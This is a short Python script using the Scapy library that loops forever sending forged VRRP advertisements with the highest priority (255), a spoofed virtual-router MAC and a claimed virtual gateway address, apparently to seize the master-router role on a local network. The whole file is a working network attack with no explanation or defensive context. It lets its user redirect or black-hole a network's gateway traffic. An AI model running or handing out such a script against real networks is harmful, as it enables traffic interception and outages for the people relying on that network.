#!/usr/bin/python

from scapy.all import *
import os

if os.geteuid() != 0:
        exit("You need to root privileges")

print("\nPress Ctrl+C to stop\n")

mac = Ether(src="00:00:5e:00:01:01",dst="01:00:5e:00:00:12")
ip = IP(src="192.168.0.1", dst="224.0.0.18",ttl=255)
vrrp = VRRP(priority=255, 
addrlist=["192.168.0.254"])
sendp(mac/ip/vrrp, inter=2, loop=1)
